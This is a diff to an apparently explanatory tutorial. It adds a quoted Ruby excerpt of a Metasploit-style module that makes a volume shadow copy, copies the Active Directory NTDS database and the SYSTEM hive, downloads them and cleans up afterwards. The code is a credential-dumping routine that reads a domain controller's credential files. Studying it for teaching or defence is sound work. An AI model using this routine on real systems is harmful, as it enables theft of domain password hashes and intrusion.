@@ -351,6 +351,20 @@ For us to have a clear understanding on how this module work, lets take a look o
         end
         unless vscpath
           vscpath = make_volume_shadow_copy(createvsc, text, bat)
+        end
+      end
+      if vscpath
+        if copy_ntds(vscpath, text) and copy_sys_hive
+          download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"))
+          download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"))
+        else
+          print_error("Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
+        end
+      end
+      cleanup_after(bat, text, "\\#{datastore['WINPATH']}\\Temp\\ntds", "\\#{datastore['WINPATH']}\\Temp\\sys")
+      disconnect
+    end
+  end
 ```
 
 Base on the source code, the module will execute the following command:
